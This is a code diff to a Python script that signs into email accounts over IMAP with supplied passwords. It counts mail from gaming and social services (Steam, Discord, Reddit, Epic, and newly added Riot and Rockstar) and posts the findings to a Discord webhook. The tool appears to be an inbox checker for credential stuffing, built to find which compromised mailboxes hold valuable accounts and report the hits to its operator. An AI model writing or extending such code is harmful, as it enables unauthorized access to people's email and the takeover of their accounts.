@@ -1,10 +1,10 @@
 import imaplib, requests, json
 from email.utils import parsedate_to_datetime
 
-with open('config.json', 'r') as config_file:
+with open('extra/Inbox/config.json', 'r') as config_file:
     config = json.load(config_file)
 
-with open('custom_checks.json', 'r') as custom_file:
+with open('extra/Inbox/custom_checks.json', 'r') as custom_file:
     custom_checks = json.load(custom_file)
 
 # Default Checks
@@ -13,6 +13,8 @@ check_steam = config["default_checks"]["steam"]
 check_discord = config["default_checks"]["discord"]
 check_reddit = config["default_checks"]["reddit"]
 check_epicgames = config["default_checks"]["epicgames"]
+check_riot = config["default_checks"]["riotgames"]
+check_rockstar = config["default_checks"]["rockstargames"]
 
 discord_webhook = config["discord_webhook"]
 
@@ -82,6 +84,14 @@ def inboxmail(email, password):
                     result, data = imap.uid("search", None, f'(FROM "help@accts.epicgames.com")')
                     if result == "OK":
                         counts['Epic Games'] = len(data[0].split())
+                if check_riot == True:
+                    result, data = imap.uid("search", None, f'(FROM "noreply@mail.accounts.riotgames.com")')
+                    if result == "OK":
+                        counts['Riot'] = len(data[0].split())
+                if check_rockstar == True:
+                    result, data = imap.uid("search", None, f'(FROM "noreply@rockstargames.com")')
+                    if result == "OK":
+                        counts['Rockstar'] = len(data[0].split())
                 
                 # Custom Checks
                 for check_name, check_info in custom_checks.items():
@@ -99,12 +109,10 @@ def inboxmail(email, password):
                     for service, count in counts.items():
                         if service == 'Reddit' and count > 1 and reddit_year:
                             message += f"{service}: {count} ✅ (Estimated Year: {reddit_year})\n"
-                        elif service == 'Discord' and count > 1 and reddit_year:
+                        elif service == 'Discord' and count > 1 and discord_year:
                             message += f"{service}: {count} ✅ (Estimated Year: {discord_year})\n"
                         elif count > 0:
                             message += f"{service}: {count} ✅\n"
-                        else:
-                            message += f"{service}: {count}\n"
                     
                     payload = {"content": message}
         requests.post(discord_webhook, data=json.dumps(payload), headers={"Content-Type": "application/json"})
